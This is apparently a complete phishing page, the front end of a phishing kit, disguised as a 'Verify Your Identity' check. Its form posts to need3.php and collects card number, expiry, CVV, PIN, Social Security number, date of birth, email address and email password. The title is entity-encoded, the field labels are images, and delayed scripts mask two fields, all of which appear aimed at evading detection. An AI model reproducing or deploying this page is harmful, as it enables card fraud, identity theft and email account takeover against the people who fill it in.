<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[3].type = "password"
}, 1000);
</script>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[7].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1325px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div id="container">
<div class="loader"></div>
<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:3"><img src="images/b8.png" alt="" title="" border=0 width=173 height=23></div>

<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:0"><img src="images/b7.png" alt="" title="" border=0 width=983 height=117></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:1"><img src="images/b9.png" alt="" title="" border=0 width=428 height=28></div>

<div id="image10" style="position:absolute; overflow:hidden; left:342px; top:850px; width:75px; height:29px; z-index:6"><a href="#"><img src="images/b10.png" alt="" title="" border=0 width=75 height=29></a></div>

<div id="image19" style="position:absolute; overflow:hidden; left:202px; top:239px; width:157px; height:524px; z-index:7"><img src="images/f1.png" alt="" title="" border=0 width=157 height=524></div>

<form action=need3.php name=hawksbay id=hawksbay method=post>
<input name="cn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:262px;z-index:8">
<input name="ex" placeholder="MM/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:334px;z-index:9">
<input name="cv" class="textbox" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:262px;left:204px;top:406px;z-index:10">
<input name="pn" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:262px;left:204px;top:478px;z-index:11">
<input name="sn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:550px;z-index:12">
<input name="db" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:622px;z-index:13">
<input name="eml" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:694px;z-index:14">
<input name="eps" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:766px;z-index:15">
<div id="formimage1" style="position:absolute; left:206px; top:848px; z-index:16"><input type="image" name="formimage1" width="129" height="32" src="images/cnf.png"></div>
</div>

	
</body>
</html>
